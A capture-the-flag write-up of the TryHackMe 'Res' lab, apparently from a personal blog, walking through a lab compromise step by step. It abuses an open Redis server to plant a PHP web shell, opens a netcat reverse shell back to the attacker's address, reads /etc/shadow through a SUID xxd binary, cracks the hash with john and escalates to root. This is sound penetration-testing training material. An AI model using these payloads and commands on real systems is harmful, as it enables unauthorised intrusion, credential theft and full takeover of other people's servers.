---
title: "Try Hack Me - Res"
date: "2022-07-11"
categories: 
  - "try-hack-me"
tags: 
  - "easy"
  - "redis"
  - "starter"
  - "thm"
  - "xxd"
---

Res is an easy, semi guided challenge from [TryHackMe](https://tryhackme.com). It is part of their Starter series and features a cool initial access vector that I had never seen before, as well as a pretty interesting privilege escalation path. As it is an easy challenge, neither are particularly difficult but I definitely enjoyed the challenge.

## Enumeration

As always, finding the open ports was the first step. I ran an initial port scan (`nmap -p- 10.10.40.166`) to find the two open ports and then ran the scan below to get more info:

~/Documents/thm/res » nmap -p80,6379 10.10.40.166 -sV -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 12:12 EDT
Nmap scan report for 10.10.40.166
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds

There's two open ports, which are 80 running a webserver and 6379 running [Redis](https://redis.io/topics/introduction). The webserver was a default page, and after some quick web enumeration scans seemed to not have anything so I moved on to Redis. Redis was the service I previously mentioned having not seen before, so I used [HackTrick's guide](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) to gather more information. It turns out that Redis is a text based service that by default isn't encrypted, so netcat can easily interact with Redis with it's normal syntax (`nc 10.10.40.166 6379`). This ability is exploitable to get a shell on the system.

## Exploitation

Again from HackTricks, [one section](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell) of their guide shows how this access with Redis can be used for remote code execution. Their guide shows using `<?php phpinfo(); ?>` to prove the code execution is possible as well as being on a different server architecture, but with a simple modification it will work for a reverse shell. Once in the netcat session, I ran these four commands back to back:

config set dir /var/www/html/
config set dbfilename redis.php
set test1 "\`<?php system($\_GET\['cmd'\]); ?>\`"
save

Basically, one thing Redis can do is be a database. This creates that database, but does it in an unintended way. It sets the location of the database file to be `/var/www/html/`, which is the default location for Apache web servers (this is where that the webserver found running on port 80 becomes important). It also sets the file name to be a php file to run a command, which can be executed by the webserver. All that had to be done now is start a netcat listener and go to `http://10.10.40.166/redis.php?cmd=nc%20-e%20/bin/bash%2010.8.89.26%204445` in a web browser to set the command to run as a netcat reverse shell. Once the listener connected, it was simple to collect the (redacted per TryHackMe's policies) user flag:

~/Documents/thm/res » nc -nlvp 4445
listening on \[any\] 4445 ...
connect to \[10.8.89.26\] from (UNKNOWN) \[10.10.40.166\] 36438
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
vianka
www-data@ubuntu:/home$ cd vianka
cd vianka
www-data@ubuntu:/home/vianka$ ls
ls
redis-stable  user.txt
www-data@ubuntu:/home/vianka$ cat user.txt
cat user.txt
<REDACTED>
www-data@ubuntu:/home/vianka$ 

## Privilege Escalation

I used [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to look for privilege escalation paths, and noticed something interesting in the SUID bit section (A manual method for this would be `find / -perm -u=s -type f 2>/dev/null`).

\-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K Jan 27  2020 /bin/mount  --->  Apple\_Mac\_OSX(Lion)\_Kernel\_xnu-1699.32.7\_except\_xnu-1699.24.8
-rwsr-xr-x 1 root root 40K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27K Jan 27  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 26  2019 /usr/bin/chfn  --->  SuSE\_9.3/10
-rwsr-xr-x 1 root root 19K Mar 18  2020 /usr/bin/xxd
-rwsr-xr-x 1 root root 39K Mar 26  2019 /usr/bin/newgrp  --->  HP-UX\_10.20
-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check\_if\_the\_sudo\_version\_is\_vulnerable
-rwsr-xr-x 1 root root 53K Mar 26  2019 /usr/bin/passwd  --->  Apple\_Mac\_OSX(03-2006)/Solaris\_8/9(12-2004)/SPARC\_8/9/Sun\_
Solaris\_2.3\_to\_2.5.1(02-1997)
-rwsr-xr-x 1 root root 74K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-r-sr-xr-x 1 root root 14K Sep  1  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper

`xxd` is not a normal SUID binary, and being able to run it as root gives the ability to read any file on the system. Reading the shadow (password) file will give us some password hashes to possibly crack:

www-data@ubuntu:/tmp$ xxd -p /etc/shadow
xxd -p /etc/shadow
<REDACTED per THM>

For whatever reason, I wasn't able to get the hex values `xxd` gives back converted back to decimal correctly in the terminal, so I used a local copy of [CyberChef](https://gchq.github.io/CyberChef/) to get the plaintext shadow file. To crack the hashes, all that was needed now was to copy the passwd (users) file, put them in together in the correct format, and run them through `john`:

~/Documents/thm/temp/res » unshadow passwd shadow > unshadowed
~/Documents/thm/temp/res » john unshadowed 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ \[SHA512 256/256 AVX2 4x\])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
<REDACTED>      (vianka)     
1g 0:00:00:06 DONE 2/3 (2022-07-01 12:21) 0.1538g/s 2447p/s 2447c/s 2447C/s maryjane1..garfield1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

Now that the password for Vianka was known, I switched to her user and continued enumeration:

www-data@ubuntu:/tmp$ su vianka
su vianka
Password: <REDACTED>

vianka@ubuntu:/tmp$ 

The first privilege escalation method checked proved to be the next step. Vianka could run any command as root:

vianka@ubuntu:/tmp$ sudo -l
sudo -l
\[sudo\] password for vianka: <REDACTED>

Matching Defaults entries for vianka on ubuntu:
    env\_reset, mail\_badpass,
    secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
vianka@ubuntu:/tmp$

All that was left to do was to switch to root and grab the root flag:

vianka@ubuntu:/tmp$ sudo su
sudo su
root@ubuntu:/tmp# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
<REDACTED>
root@ubuntu:~#
